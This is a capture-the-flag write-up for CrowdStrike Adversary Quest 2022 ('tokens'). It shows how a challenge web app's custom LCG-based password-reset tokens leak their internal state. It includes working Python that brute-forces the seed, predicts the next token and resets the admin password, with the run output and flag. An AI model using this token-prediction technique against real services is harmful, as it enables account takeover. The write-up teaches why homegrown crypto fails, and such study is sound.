# Crowdstrike Adversary Quest 2022 / Tabloid Jackal / #4 tokens

## Challenge Description

After getting root, the TABLOID JACKAL explored all the accounts that exist on the laptop. They thereby found out that the editor is using a special web application (reachable at 116.202.83.208:42300) for reviewing articles in the publishing pipeline. Moreover, they observed that the editor is using the admin account for this purpose. We believe that TABLOID JACKAL found a vulnerability in it that can be exploited to get access to the editor’s reviewer account.

Note: Flags will be easily identifiable by the format “CS{some_secret_flag_text}”. They must be submitted in full, including “CS{“ and “}”.

## TL;DR Summary

- The target web service is using a custom PRNG to generate password reset tokens.
- The algorithm is found in a directory of the web server, that is mentioned in its **robots.txt** file.
- The custom PRNG is bad/vulnerable in that its internal state/seed can be guesstimated from a given token.
- Thus being able to clone the PRNG state, future token values can be calculated.
- Knowing the next token value, a password reset & change for the admin user can be achieved, yielding the flag.

## Analysis

Laptop user is said to use **admin** on given web service. The goal of this challenges might be to get access to the admin account. The challenge name is **tokens**. This could be a hint.

This write-up includes following dead-end roads. Skip to **Dead-end road?** to directly read the working approach.

### Web Service Recon

The web service @ `116.202.83.208:42300` has a menu bar with **Editorial Access**, **Mailbox Access** and **Users**.

#### Editorial Access

Link: `http://116.202.83.208:42300/editorial`

This redirects not logged-in users to `/login` (GET request).

Link: `http://116.202.83.208:42300/login`

A login page is shown with required form fields **Username** (field name: name) and **Editorial Password** (field name: pweditorial). Form button is **Login** and **I forgot password**. Executes POST request on `/login`.

The page also contains a buttong **I forgot password**, which seems to be a password reset function. Clicking on it displays a **Password Reset** form with field **Username** (field name: name). Form button **Login** executes a POST on `/reset`.

Upon submitting a user name to the password reset function, a window pops up reading that a _password reset link has been sent to the mailbox_. Interesting.

It then shows a password reset form with fields **Username** (field name: name), **Reset Token** (field name: resettoken) and **New Password** (field name: new_pweditorial). Form button **Reset** will issue a POST on `/chpass`.

#### Mailbox Access

Link: `http://116.202.83.208:42300/mailbox`

A different login page is shown. Requests **Name** (field name: username) and **Mailbox Password** (field name: pwmail). Form button is **Load E-Mails**. Executes POST on `/mailbox` on submit.

#### Users

When clicking on menu item **Users**, a drop down list with entries **Register New User** and **Login** are shown. The former is a link to `/register`, the latter to already known `/login` (see above).

##### Register New User

Link: `http://116.202.83.208:42300/register`

This page contains a form with fields **Username** (field name: name), **Editorial Password** (field name: pweditorial) and **Mailbox Password** (field name: pwmail). Form button **Register** will issue a POST on `/register`.

##### Logging Out

Link: `http://116.202.83.208:42300/logout`

Obviously logs a logged-in user out.

### Web Service Usage - Registering a new User

Let's see what happens if we try to use the web service halfway normally.

Registering a new user issues a POST request like the following. It also displays a small popup window reading the user was registered successfully.

```http
POST /register HTTP/1.1
Host: 116.202.83.208:42300
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://116.202.83.208:42300
Connection: close
Referer: http://116.202.83.208:42300/register
Upgrade-Insecure-Requests: 1

name=hans&pweditorial=pw1&pwmail=pw2
```

A redirect follows to `<a href="/login?register=ok">/login?register=ok</a>`.

Accessing the user's mailbox shows a welcome message reading _Welcome! Please note that in the case of losing the password to both, editorial and this mailbox, IT has to reset your passwords manually._

Accessing the user's editorial access shows an empty list of _Articles for Review_.

### The if-you-didn't-do-your-homework-well-enough Approach

This approach was (nearly) totally useless. We might have ended the initial web service recon phase too early... It is included in this write-up to show dead-end approaches, which are followed all the time - but never shown or talked about in polished write-ups.

One approach could be to create users yourself, request password reset tokens and analyze them.

For user hans (pw1/pw2):

```txt
2022-07-16 22:15:21 	Reset token is 35848510189878. Please go to /reset to handle reset.
[...]
```

For user wurst (pass1/pass2):

```txt
2022-07-16 22:22:38 	Reset token is 157290380848869. Please go to /reset to handle reset.
[...]
```

Thoughts:

Could it be an attack like on Mersenne Twister - trying to clone the state of a PRNG? But that would require knowing the first n tokens to calculate the next. For user **admin** we do not know any token nor can we get one. The latter would only be problem, if the tokens would be calculated on a per user basis. If the tokens are generated globally on the server, it could work?

Attacking MT19937 / Cloning the generator (awesome posts, check them out... but totally not needed to be read for this challenge).

- <https://www.schutzwerk.com/en/43/posts/attacking_a_random_number_generator/>
- <https://blog.infosectcbr.com.au/2019/08/cryptopals-challenge-23-clone-mt19937.html>
- <https://alephsecurity.com/2019/09/02/Z3-for-webapp-security/>

Token is likely based on a pseudo random number generator (PRNG). Could be a linear congruential generator (LCG) of the form `x(n+1) = (a*x + c) mod m` with a being the multiplier, c the increment, m the modulus and x(0) the seed.

Approach could be:

- Register a user, fire 1K password reset requests, grab the mails, parse for the 1K tokens, have `crack_mt` try to clone the generator with the first 624-ish.

#### Programmatically gathering tokens

See [collect_tokens.py](./collect_tokens.py), output from example runs (u=1 user, n=20 token resets each).

```txt
└─$ ./collect_tokens.py | tee 02.log
[*] Registering user tsdkhrunvq with editorial pw=pwedit and mail pw=pwmail
[*] Requesting 20 password reset tokens
[*] Gathering reset tokens from mailbox
[=] Timestamp = 2022-07-17 18:34:41 (epoch = 1658082881), Token = 183221511699968 (0xa6a3951ebe00)
[...]
[*] Tokenlist (epoch, token) = [[1658082881, 183221511699968], [1658082881, 173676348029041], [1658082882, 82091439281448], [1658082882, 181116545985779], [1658082882, 168168363090286], [1658082882, 55587987895904], [1658082882, 224274764609836], [1658082882, 231283055260264], [1658082882, 46154456622140], [1658082882, 66005588226554], [1658082882, 35028281816914], [1658082882, 88322904871159], [1658082882, 68342999158064], [1658082882, 146350243088051], [1658082882, 260221110553107], [1658082882, 18615999223348], [1658082882, 7182338824555], [1658082882, 252362436387131], [1658082882, 146196984251601], [1658082882, 208530177262328]]                          
```

Observations:

- Tokens seem to be 6 byte integer values
- A per user seeding with epoch/username is not directly spottable - but could theoretically be there
- No duplicates in 1100 resets `dupes = [x for n, x in enumerate(tokenlist) if x in tokenlist[:n]]`

```txt
>>> max(tokenlist), hex(max(tokenlist))
(281004211781021, '0xff9264393d9d')
>>> min(tokenlist), hex(min(tokenlist))
(47280104815, '0xb021d256f')
```

- What do we know about the server? `Server: Werkzeug/2.1.2 Python/3.10.4`
- Implementation of random.randbytes() in Python 3.10 seems to be based on os.urandom, not MT19937 - DUH!?
- May make crack MT approach obsolete

Okay, time to leave this rabbit hole. On the positive side: At least we do now have code to programmatically register new users, trigger password resets and collect token values from the mailbox. This will come in handy later on!

### Dead-end road?

Since all of the above information gathering and approaches didn't work out, it's a good time to step back and start anew again. Was something missing from initial recon?

Checking for file **robots.txt** on the web server finds an interesting entry: `Disallow: /.git`

That path contains a single reference to [http://116.202.83.208:42300/.git/random_generator.py](./random_generator.py).

Oh noes! Why didn't we spot that n hours earlier?

### Analyzing random_generator.py

Taking a closer look at the custom PRNG algorithm.

```python
class Random(object):
        def __init__(self, seed):
                self.seed = seed
                self.multiplier = 0x5DEECE66D
                self.addend = 0xB
                self.mask = (1 << 48) - 1

        def _next(self):
                newseed = (self.seed * self.multiplier + self.addend) & self.mask
                self.seed = newseed
                return newseed >> 22

        def next(self):
                return self._next() + self._next()  * 2**21 + self._next()  * 2**42

        def next_limit(self, limit):
                return self.next() % limit

if __name__ == "__main__":
        random = Random(241445724851231)
        print(random.next_limit(281474976710656))
```

The constructor sets its internal seed value to the passed parameter seed and defines the parameters for a linear congruential generator (LCG) `a * x + c mod m` with the values

- `a = 0x5DEECE66D`
- `c = 0xB`
- `m = 0x1000000000000` (hint: binary AND'ing with `(1<<48)-1` is equal to modulo `(1<<48)`) 

The initial seed value used in this script is 241445724851231. We do not know if the same seeding was used by the running web service.

The token calculation and seed manipulation works like this

- `n0 = a * seed + c mod m` (intermediate, 48 bit value)
- `n1 = a * n0 + c mod m` (intermediate, 48 bit value)
- `n2 = a * n1 + c mod m` (48 bit value)
- `seed = n2`
- `next token t = n0 >> 22 + (n1 >> 22) << 21 + (n2 >> 22) << 42 mod m`

### Goal: Find a way to guesstimate the token t(n+1) following token t(n)

If we can recover/guesstimate n0 from a given token t, we can clone the PRNG and calculate future token values.

#### Naive Approach

What if the above custom PRNG with the given seed is being used by the web service as-is? Then we could let it generate a password reset token (e.g. manual trigger) and see if the PRNG algorithm will generate this token value.

```python
if __name__ == "__main__":
  # Initial seeding from random_generator.py
  random = Random(241445724851231)

  # A token value we got from some password reset - and my scripts generated a few thousands, just in case ;-)
  token_n = 107482740668796

  # Try to find it with custom PRNG
  while 1:
    token = random.next_limit(281474976710656)
    if token == token_n:
      print(f"Found token_n = {token_n}")
```

Okay, that would have been too easy. But it was worth a try... So we need to find a smarter approach.

#### Binary Analysis of the first generated Token value

Using the initial seed value of 241445724851231,

- The first generated token will have the value of 220009097784738
- The internal seed values are
  - n0 = 52481961263934
  - n1 = 246504125207921
  - n2 = 91731469805352

Converting the values to their binary representation

```txt
444444443333333333222222222211111111110000000000
765432109876543210987654321098765432109876543210

001011111011101101101000101010001000001100111110 n0 = 52481961263934
111000000011000110110110110100011001010101110001 n1 = 246504125207921
010100110110110111100101101011000010011100101000 n2 = 91731469805352
110010000001100011011100000111101110110110100010 t  = 220009097784738
```

Now align the Bits according to the custom PRNG's shift operations.

```txt
                                          44444444333333333322222222 Bits
                                          76543210987654321098765432 of n0

                     44444444333333333322222222                      Bits
                     76543210987654321098765432                      of n1

4444444433333333332222222                                            Bits
7654321098765432109876543                                            of n2
                                          00101111101110110110100010 n0>>22
                     11100000001100011011011011000000000000000000000 (n1>>22)<<21
01010011011011011110010110000000000000000000000000000000000000000000 (n2>>22)<<42
--------------------------------------------------------------------
01010011011011011110110010000001100011011100000111101110110110100010 n0+n1+n2 = s
--------------------------------------------------------------------
                    110010000001100011011100000111101110110110100010 t

                    444444443333333333222222222211111111110000000000 Bits of
                    765432109876543210987654321098765432109876543210 t
```

This custom PRNG seems to mix/shift the internal seed value n0, n1, n2 in a way that lets us recover a significant amount of bits of n0 from the token value.

- Bits 20..0 of t are equal to Bits 42..22 of n0

This circumstance alone reduces the complexity to guesstimate/bruteforce n0 from 2^48 to 2^27, which is a mere 134 million possibilities.

Adding two more constraints may additionally speed up guesstimating:

- Bits 42..27 of t must be equal to Bits 43..28 of n1 (Constraint0)
- Bits 26..21 of t must be equal to the sum of Bits 47..43 of n0 and Bits 27..22 of n1 (Constaint1)

### Pseudo Implementation of the Approach

Assumptions, Goals, Variables

- Assume 48 bit binary values n0, n1, t are saved in first bitarray [47..0]
- Derive/crack n0/n1/n2 from t(n) to calculate t(n+1)
- `a = 0x5DEECE66D`, `c = 0xB`, `mask = (1 << 48) - 1`

Iterate over all possible combinations of Bits [47..43] and Bits [21..0] of n0 (5 + 22 = 27 Bits, 2^27 = 134.217.728 possibilities)

Outer loop: Iterate over all combinations of Bits[47..43] // 5 Bits, 2^5 = 32 Values

Inner loop: Iterate over all combinations of Bits[21..0] // 22 Bits, 2^22 = 4.194.304 Values 

- Set Bits[47..43] of n0 = Outer loop index value (upper Bits)
- Set Bits[42..22] of n0 = Bits[20..0] of t
- Set Bits[21..0] of n0 = Inner loop index value (lower Bits)
- Calculate `n1 = (a * n0 + c) & mask`
- Test if Bits[43..28] of n1 == Bits[42..27] of t // Constraint0, len = 16 bits
  - Break if constraint0 is not met
- Test if (Bits[47..43] of n0 + Bits[26..22] of n1) & 0x3f == Bits[26..21] of t // Constraint1
  - Break if constraint1 is not met
- Calc n2 = (a * n1 + c) & mask
- Calc t_guess = n0 >> 22 + (n1 >> 22) << 21 + (n2 >> 22) << 42 mod m
- If t_guess == t, win!

### Python Implementation

The following function **brute_seeds** will iterate over the 2^27 possibilities for unknown bit values of n0, save some calculation time by checking for constraints0 and 1 and return the internal seed values n0, n1 and n2.

```python
def brute_seeds(token):
  t = int(token)
  t_rsh_21 = t >> 21
  t_rsh_43 = t >> 43
  t_and_7fff8 = t & 0x7fff8000000
  a = 0x5DEECE66D # multiplier
  c = 0xB # addend
  mask = (1 << 48) -1

  n0_middle_bits = (t & 0x1fffff) << 22
  done = False

  for cur_upper_bits in range(1 << 5):
    if done:
      break

    for cur_lower_bits in range(1 << 22):
      n0 = n0_middle_bits
      n0 += cur_upper_bits << 43
      n0 += cur_lower_bits
      n1 = (a * n0 + c) & mask

      # constraint0
      if (n1 >> 1) & 0x7fff8000000 != t_and_7fff8:
        continue

      # constraint1
      if cur_upper_bits + (n1 >> 22) & 0x3f != (t_rsh_21) & 0x3f:
        continue

      n2 = (a * n1 + c) & mask
      t2 = ((n0 >> 22) + ((n1 >> 22) << 21) + ((n2 >> 22) << 42)) & 0xffffffffffff
      if t2 == t:
        done = True
        return(n0, n1, n2)
        break
```

Once we have found the internal state values n0, n1 and n2, clone the custom PRNG with seed = n2 and calculate the next token value. This will be the next token value used for password resets - if we're fast enough, we can try to use this to reset the admin password.

```python
  # brute custom PRNG seeds (internal state) for this token
  n0, n1, n2 = brute_seeds(token)
  
  # clone internal state of custom PRNG (seed with n2) in order to calculate the next token
  random = Random(n2)
  next_token = random.next_limit(281474976710656)
```

See [pwn_tokens.py](./pwn_tokens.py) for the fully automated solution script.

### Final Run / Flag Time!

```txt
└─$ ./pwn_tokens.py                                                                                                     1 ⨯
[*] Registering user jigvccslxx with editorial pw=pwedit and mail pw=pwmail
[*] Requesting password reset token for user jigvccslxx
[*] Gathering reset tokens from mailbox
[=] Timestamp = 2022-07-19 22:56:50, Token = 38052921756581 (0x229be2e24ba5)
[=] Next token after 38052921756581 will be 124975198277138
[*] Requesting password reset token for user admin
[*] Changing password for user admin to wvnvplchjd
[*] Grabbing editorial entries for user admin
[*] Flag = CS{cUsT0m_CruPt0_1s_1337}
```

## Flag

Flag: **CS{cUsT0m_CruPt0_1s_1337}**

## Conclusion

Don't do custom crypto, use proper algorithms!
